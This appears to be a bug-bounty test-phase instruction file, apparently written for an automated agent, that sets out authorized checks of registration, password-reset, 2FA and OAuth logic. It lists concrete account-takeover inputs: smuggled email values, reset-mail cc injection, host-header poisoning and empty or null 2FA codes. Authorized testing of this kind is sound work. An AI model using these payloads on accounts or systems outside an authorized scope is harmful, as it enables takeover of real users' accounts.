# Account & auth-flow logic — registration, reset, 2FA, OAuth (read this first)

<!-- ===================== MANDATORY RUN CONTRACT ===================== -->
<!-- If this phase is running you MUST read this whole file and work every MUST
     step that the target's surface supports. This is ACCOUNT/AUTH LOGIC
     (sign-up, password reset, 2FA, OAuth linking) - NOT object-level
     authorization / IDOR (a separate effort). Everything here is done with your
     OWN accounts and temp mailboxes, non-destructive, in scope, rate-limited.
     Each MUST step produces leads/findings via hk; a summary without the
     recorded finding is a FAILURE. Skip a step only if the target has no such
     surface, and say so with `hk note`. -->

## RUN CONTRACT — complete every MUST that applies

- [ ] **M1 Map the auth surface**: from `hk endpoints` / `hk handoff` (esp.
      06c-jsintel) list the registration, login, password-reset, email-change,
      2FA/MFA, invite and OAuth endpoints. → artifact: `auth-surface.md`
- [ ] **M2 Registration abuse**: test the email parser and account-creation
      logic (details below). Record each real issue with `hk finding add`.
- [ ] **M3 Password-reset abuse**: multi-recipient injection, token leakage,
      host-header poisoning (details below).
- [ ] **M4 2FA/MFA logic**: method-swap, reset-skips-2FA, expired/empty code,
      sequential recovery codes, MFA-missing on an endpoint (details below).
- [ ] **M5 OAuth / social-login linking**: account-linking confusion
      (details below) - record as a lead where it needs a manual provider step.
- [ ] **M6 Completion gate**: ./handoff.md listing what was tested, the
      confirmed issues, and anything needing a manual step. Only after M1–M5.
<!-- =================== END MANDATORY RUN CONTRACT =================== -->

Rules: use ONLY accounts you created (see ./test-credentials.txt) and temp
mailboxes (mail.tm) or the program relay address. Never touch a real user's
account. If the program excludes a class (e.g. "no account/email enumeration"),
skip it and note it. Smallest possible proof; stop once it is shown.

## M2 — Registration abuse
Create accounts with crafted emails and watch for collision / takeover:
- Case + alias: `victim@x.com` vs `Victim@x.com`, `victim+tag@x.com`.
- Whitespace/control: trailing space `victim@x.com `, `%00`/`%09`/`%20`,
  `victim@x.com%0a`.
- Parser confusion: `victim@x.com@attacker.com`, `attacker@x.com@victim.com`,
  a second email after `\n`: `{"email":"victim@x.com\nattacker@x.com"}`.
- Register OVER an existing/unverified account (same email, new password) → can
  you then log in as that account? Classic pre-verification ATO.
- UUID→numeric on a register endpoint (`/api/register/<uuid>` → `/2`): can you
  create a user under another org?
A collision that lets you log into, or overwrite, another email's account is a
finding (`hk finding add --kind auth-logic`). Enumeration alone (just a
different error) is a weak lead unless the program accepts it.

## M3 — Password-reset abuse
- Multi-recipient injection (deliver the reset to you as well as the victim):
  `{"email":["victim@x.com","attacker@x.com"]}`, comma/space/`;`/`\n` separated,
  `email=victim@x.com%0acc:attacker@x.com` (and bcc), HPP with two `email` keys.
- Token in the response / session id: capture the reset request+response; is the
  token, or something it is derived from, visible to the requester?
- Host-header poisoning of the reset link: `Host: attacker.test` (and
  `X-Forwarded-Host`) → does the emailed link point at your host? (Use the OOB
  host; a link to it in the mailbox is the proof.)
A reset you can redirect to an attacker, or a token you can predict/read, is a
finding.

## M4 — 2FA / MFA logic
- Method swap: the OTP-send call `POST /mfa/resend` → try `DELETE`/`GET`/`PUT`;
  does it disable or skip 2FA?
- Reset-skips-2FA: complete a password reset, then log in — is 2FA still
  enforced?
- Expired / empty / null code: wait for the code to expire then submit anything;
  submit `code:""` / `code:null` immediately (a race before the async write).
- Sequential recovery codes: enable 2FA on two accounts; are the recovery codes
  in sequence (→ guessable)?
- MFA-missing endpoint: enable MFA on account A; with the no-MFA account B,
  browse the surface — an endpoint that does not demand MFA where A's does is a
  gap (autorize-style diff).
Response manipulation (false→true, 403→200 in the client) is a CLIENT-SIDE
signal only — verify it server-side before recording, or record it as a lead
clearly marked "needs server-side confirmation".

## M5 — OAuth / social-login linking
- Link-with-no-email confusion: sign in with a social provider configured to
  share no email; the app asks you to type one → type the victim's. Does it link
  to the victim without verification? (This needs a manual provider step — record
  as a lead with the exact flow and point the operator at it.)
- `redirect_uri` / `state` quirks and code-in-URL leakage via Referer feed the
  injection and free-hunt phases — record them as leads, do not brute anything.

## Recording
`hk finding add --kind auth-logic --severity <guess> --url <endpoint> --summary
"intended vs what happens" --steps "exact requests incl. the control" --impact
"what an attacker gains (e.g. ATO)"`, status candidate. Weaker/manual ones →
`hk add lead auth-logic <url> --evidence "..."`. Mask any token/secret.
